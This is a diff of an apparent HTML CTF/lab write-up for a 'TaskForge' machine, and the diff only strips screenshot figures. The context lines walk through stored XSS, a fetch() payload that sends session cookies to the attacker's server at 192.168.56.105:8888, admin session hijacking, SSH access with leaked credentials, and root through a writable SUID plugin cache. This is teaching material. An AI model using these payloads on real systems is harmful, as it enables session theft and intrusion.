@@ -266,15 +266,6 @@
           <li><code>-oN</code> saves the output in normal format.</li>
         </ul>
 
-        <figure>
-          <img
-            src="../screenshots/nmap_scan.png"
-            alt="Nmap scan results"
-            loading="lazy"
-            decoding="async"
-          >
-        </figure>
-
       </div>
 
     </div>
@@ -297,37 +288,11 @@
           page and authenticated into the TaskForge dashboard.
         </p>
 
-        <figure>
-          <img
-            src="../screenshots/login.png"
-            alt="TaskForge login page"
-            loading="lazy"
-            decoding="async"
-          >
-        </figure>
-
-        <figure>
-          <img
-            src="../screenshots/dashboard.png"
-            alt="TaskForge dashboard"
-            loading="lazy"
-            decoding="async"
-          >
-        </figure>
 
         <p>
           The Findings section displayed previously submitted findings.
           Each finding could be opened to view its submitted details.
         </p>
-
-        <figure>
-          <img
-            src="../screenshots/findings.png"
-            alt="TaskForge findings page"
-            loading="lazy"
-            decoding="async"
-          >
-        </figure>
 
         <p>
           The application also provided a New Finding form containing
@@ -335,15 +300,6 @@
           content was subsequently displayed as part of the finding,
           I investigated the input handling.
         </p>
-
-        <figure>
-          <img
-            src="../screenshots/newfindings.png"
-            alt="TaskForge new finding form"
-            loading="lazy"
-            decoding="async"
-          >
-        </figure>
 
       </div>
 
@@ -371,29 +327,11 @@
 
         <pre><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre>
 
-        <figure>
-          <img
-            src="../screenshots/xsstesting.png"
-            alt="Stored XSS testing"
-            loading="lazy"
-            decoding="async"
-          >
-        </figure>
-
         <p>
           When I opened the submitted finding, the JavaScript executed
           and displayed the session cookie. This confirmed that the
           finding content was vulnerable to stored XSS.
         </p>
-
-        <figure>
-          <img
-            src="../screenshots/alertcookie.png"
-            alt="Cookie displayed by the XSS test"
-            loading="lazy"
-            decoding="async"
-          >
-        </figure>
 
       </div>
 
@@ -428,15 +366,6 @@
 
         <pre><code>python3 -m http.server 8888</code></pre>
 
-        <figure>
-          <img
-            src="../screenshots/serverpy.png"
-            alt="Python HTTP server"
-            loading="lazy"
-            decoding="async"
-          >
-        </figure>
-
         <p>
           I then submitted a new finding containing the following
           payload in the description field:
@@ -444,29 +373,11 @@
 
         <pre><code>&lt;img src=x onerror='fetch("http://192.168.56.105:8888/?cookie"+document.cookie)'&gt;</code></pre>
 
-        <figure>
-          <img
-            src="../screenshots/payload.png"
-            alt="Stored XSS payload"
-            loading="lazy"
-            decoding="async"
-          >
-        </figure>
-
         <p>
           When the reviewer processed the finding, the Python server
           received a request containing the reviewer's session
           cookie.
         </p>
-
-        <figure>
-          <img
-            src="../screenshots/servercallback.png"
-            alt="Callback received from the reviewer"
-            loading="lazy"
-            decoding="async"
-          >
-        </figure>
 
         <p>
           I replaced my current application session with the captured
@@ -474,25 +385,7 @@
           recognized the session as the administrator account.
         </p>
 
-        <figure>
-          <img
-            src="../screenshots/session.png"
-            alt="Captured administrator session"
-            loading="lazy"
-            decoding="async"
-          >
-        </figure>
-
-        <figure>
-          <img
-            src="../screenshots/admindash.png"
-            alt="Administrator dashboard"
-            loading="lazy"
-            decoding="async"
-          >
-        </figure>
-
-      </div>
+        </div>
 
     </div>
   </section>
@@ -514,29 +407,11 @@
           System Configuration section.
         </p>
 
-        <figure>
-          <img
-            src="../screenshots/reviewerque.png"
-            alt="Administrator review queue"
-            loading="lazy"
-            decoding="async"
-          >
-        </figure>
-
         <p>
           The System Configuration page exposed deployment
           configuration containing the SSH service information and
           credentials required to access the machine.
         </p>
-
-        <figure>
-          <img
-            src="../screenshots/sshcreds.png"
-            alt="System configuration containing SSH information"
-            loading="lazy"
-            decoding="async"
-          >
-        </figure>
 
         <p>
           Using the obtained SSH credentials, I connected to the
@@ -544,15 +419,6 @@
         </p>
 
         <pre><code>ssh admin@192.168.56.106</code></pre>
-
-        <figure>
-          <img
-            src="../screenshots/sshlog.png"
-            alt="SSH login as admin"
-            loading="lazy"
-            decoding="async"
-          >
-        </figure>
 
       </div>
 
@@ -578,15 +444,6 @@
 
         <pre><code>find / -perm -4000 -type f 2&gt;/dev/null</code></pre>
 
-        <figure>
-          <img
-            src="../screenshots/find.png"
-            alt="SUID enumeration results"
-            loading="lazy"
-            decoding="async"
-          >
-        </figure>
-
         <h3>Inspecting taskforge-plugin</h3>
 
         <p>
@@ -600,24 +457,6 @@
 file /usr/local/bin/taskforge-plugin
 strings /usr/local/bin/taskforge-plugin</code></pre>
 
-        <figure>
-          <img
-            src="../screenshots/taskpluginfiles.png"
-            alt="TaskForge plugin file information"
-            loading="lazy"
-            decoding="async"
-          >
-        </figure>
-
-        <figure>
-          <img
-            src="../screenshots/taskpluginstrings.png"
-            alt="Strings extracted from taskforge-plugin"
-            loading="lazy"
-            decoding="async"
-          >
-        </figure>
-
         <p>
           One particularly useful string revealed the plugin loading
           convention:
@@ -630,15 +469,6 @@ strings /usr/local/bin/taskforge-plugin</code></pre>
           <code>/opt/taskforge/plugin-cache/</code>. I then checked
           the directory permissions.
         </p>
-
-        <figure>
-          <img
-            src="../screenshots/plugincacheal.png"
-            alt="Plugin cache directory permissions"
-            loading="lazy"
-            decoding="async"
-          >
-        </figure>
 
         <p>
           The <code>admin</code> user could write to the plugin cache
@@ -705,15 +535,6 @@ void plugin_run(void)
 
         <pre><code>whoami
 id</code></pre>
-
-        <figure>
-          <img
-            src="../screenshots/rootshell.png"
-            alt="Root shell obtained through taskforge-plugin"
-            loading="lazy"
-            decoding="async"
-          >
-        </figure>
 
         <p>
           The privilege escalation works because the SUID
